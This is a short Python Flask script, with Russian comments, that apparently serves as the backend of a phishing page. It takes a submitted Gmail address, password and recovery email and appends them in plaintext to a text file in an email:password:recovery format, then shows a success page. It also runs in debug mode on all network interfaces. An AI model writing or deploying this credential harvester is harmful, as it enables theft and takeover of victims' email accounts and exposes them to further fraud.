import os
from flask import Flask, render_template, request

app = Flask(__name__)

# Путь к файлу для хранения данных
data_file = "user_data.txt"

@app.route("/", methods=["GET", "POST"])
def form():
    if request.method == "POST":
        gmail = request.form.get("gmail")
        password = request.form.get("password")
        recovery_email = request.form.get("recovery_email")

        # Запись данных в файл
        with open(data_file, "a") as file:
            # Форматирование строки без пробелов и с двоеточиями
            file.write(f"{gmail}:{password}:{recovery_email}\n")

        # Отображение страницы с успешной отправкой данных
        return render_template("success.html", gmail=gmail, recovery_email=recovery_email)

    return render_template("form.html")

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
